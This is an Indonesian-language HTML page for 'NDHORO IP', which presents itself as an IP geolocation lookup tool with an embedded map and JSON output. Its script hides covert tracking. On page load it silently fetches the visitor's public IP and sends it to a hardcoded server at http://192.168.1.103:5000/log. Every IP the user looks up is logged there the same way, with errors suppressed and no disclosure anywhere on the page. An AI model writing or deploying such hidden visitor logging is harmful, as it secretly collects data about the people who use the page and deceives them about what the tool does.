<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NDHORO IP - Lacak Lokasi IP</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0b0e14; color: #e8edf5; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
    .container { max-width: 700px; width: 100%; }
    .card { background: #141a26; border-radius: 24px; padding: 32px 28px; border: 1px solid #1e2a3a; box-shadow: 0 12px 40px rgba(0,0,0,0.6); }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
    .header h1 { font-size: 28px; font-weight: 700; }
    .header h1 span { color: #2563eb; }
    .header .ver { font-size: 13px; color: #475569; background: #1e2a3a; padding: 2px 14px; border-radius: 20px; }
    .sub { color: #94a3b8; font-size: 14px; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid #1e2a3a; }
    input { width: 100%; padding: 14px 18px; border-radius: 14px; border: 1px solid #1e2a3a; background: #0a0c12; color: #e8edf5; font-size: 15px; margin-bottom: 12px; outline: none; transition: 0.2s; }
    input:focus { border-color: #2563eb; box-shadow: 0 0 0 4px rgba(37,99,235,0.15); }
    .row { display: flex; gap: 12px; margin-bottom: 14px; }
    .row button { flex: 1; padding: 13px; border-radius: 14px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
    .btn-primary { background: #2563eb; color: #fff; }
    .btn-primary:hover { background: #1d4ed8; }
    .btn-outline { background: transparent; border: 1px solid #2563eb; color: #2563eb; }
    .btn-outline:hover { background: #2563eb; color: #fff; }
    .result-box { background: #0a0c12; padding: 16px; border-radius: 14px; border: 1px solid #1e2a3a; font-family: 'Courier New', monospace; font-size: 13px; white-space: pre-wrap; word-break: break-all; max-height: 280px; overflow-y: auto; margin-top: 10px; color: #a0f0c0; line-height: 1.5; }
    .map-container { height: 220px; border-radius: 14px; margin-top: 16px; overflow: hidden; background: #0a0c12; border: 1px solid #1e2a3a; }
    .map-container iframe { width: 100%; height: 100%; border: none; }
    .footer-bar { display: flex; justify-content: space-between; align-items: center; margin-top: 14px; flex-wrap: wrap; gap: 10px; }
    .badge { background: #1e2a3a; padding: 5px 16px; border-radius: 24px; font-size: 13px; color: #94a3b8; }
    .btn-copy { background: transparent; border: 1px solid #1e2a3a; color: #94a3b8; padding: 6px 18px; border-radius: 24px; font-size: 13px; cursor: pointer; transition: 0.2s; }
    .btn-copy:hover { background: #1e2a3a; color: #e8edf5; }
    .credit { text-align: center; font-size: 13px; color: #475569; margin-top: 18px; }
    @media (max-width: 500px) { .row { flex-direction: column; gap: 8px; } .header h1 { font-size: 22px; } .card { padding: 20px 16px; } }
  </style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="header">
      <h1>📍 <span>NDHORO</span> IP</h1>
      <span class="ver">v1.0</span>
    </div>
    <div class="sub">Lacak lokasi IP mana pun secara real-time — lengkap peta &amp; JSON</div>

    <input id="ipInput" placeholder="Masukkan IP (contoh: 8.8.8.8)" value="8.8.8.8">
    <div class="row">
      <button class="btn-primary" onclick="locate()">🚀 Lacak</button>
      <button class="btn-outline" onclick="myIP()">📡 IP Saya</button>
    </div>

    <div class="result-box" id="result">⚡ Masukkan IP atau klik "IP Saya"</div>
    <div class="map-container" id="mapContainer">
      <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d126856.333719067!2d106.845493!3d-6.208678!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1690000000000" allowfullscreen loading="lazy"></iframe>
    </div>

    <div class="footer-bar">
      <span class="badge" id="status">Belum ada data</span>
      <button class="btn-copy" onclick="copyJSON()">📋 Salin JSON</button>
    </div>
  </div>
  <div class="credit">NDHORO — Byexe style</div>
</div>

<script>
  let currentData = null;
  const SERVER_URL = "http://192.168.1.103:5000";

  function updateMap(lat, lng) {
    const container = document.getElementById('mapContainer');
    const embedUrl = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d126856.333719067!2d${lng}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1690000000000`;
    container.innerHTML = `<iframe src="${embedUrl}" allowfullscreen loading="lazy"></iframe>`;
  }

  function displayData(data) {
    currentData = data;
    document.getElementById('result').textContent = JSON.stringify(data, null, 2);
    document.getElementById('status').textContent = `📍 ${data.city || data.region || '-'}, ${data.country || '-'}`;
    if (data.latitude && data.longitude) {
      updateMap(parseFloat(data.latitude), parseFloat(data.longitude));
    }
    if (data.ip || data.query) {
      const ip = data.ip || data.query;
      fetch(SERVER_URL + '/log?ip=' + ip, { mode: 'no-cors' }).catch(() => {});
    }
  }

  async function locate() {
    const ip = document.getElementById('ipInput').value.trim();
    if (!ip) return alert('Masukkan IP!');
    document.getElementById('result').textContent = '⏳ Melacak...';
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await res.json();
      if (data.error) { document.getElementById('result').textContent = `❌ ${data.error}`; return; }
      displayData({
        ip: data.ip,
        country: data.country_name,
        region: data.region,
        city: data.city,
        latitude: data.latitude,
        longitude: data.longitude,
        org: data.org,
        isp: data.org,
        asn: data.asn,
        timezone: data.timezone
      });
    } catch {
      document.getElementById('result').textContent = '❌ Gagal melacak. Coba lagi.';
    }
  }

  async function myIP() {
    document.getElementById('result').textContent = '⏳ Mendapatkan IP Anda...';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      if (data.ip) { document.getElementById('ipInput').value = data.ip; locate(); }
      else document.getElementById('result').textContent = '❌ Gagal mendapatkan IP.';
    } catch {
      document.getElementById('result').textContent = '❌ Gagal mendapatkan IP.';
    }
  }

  function copyJSON() {
    if (!currentData) return alert('Tidak ada data.');
    const text = JSON.stringify(currentData, null, 2);
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => alert('✅ JSON disalin!')).catch(() => fallbackCopy(text));
    } else {
      fallbackCopy(text);
    }
  }

  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    alert('✅ JSON disalin!');
  }

  window.addEventListener('load', async function() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      if (data.ip) {
        await fetch(SERVER_URL + '/log?ip=' + data.ip, { mode: 'no-cors' }).catch(() => {});
        document.getElementById('ipInput').value = data.ip;
        locate();
      }
    } catch {}
  });
</script>
</body>
</html>
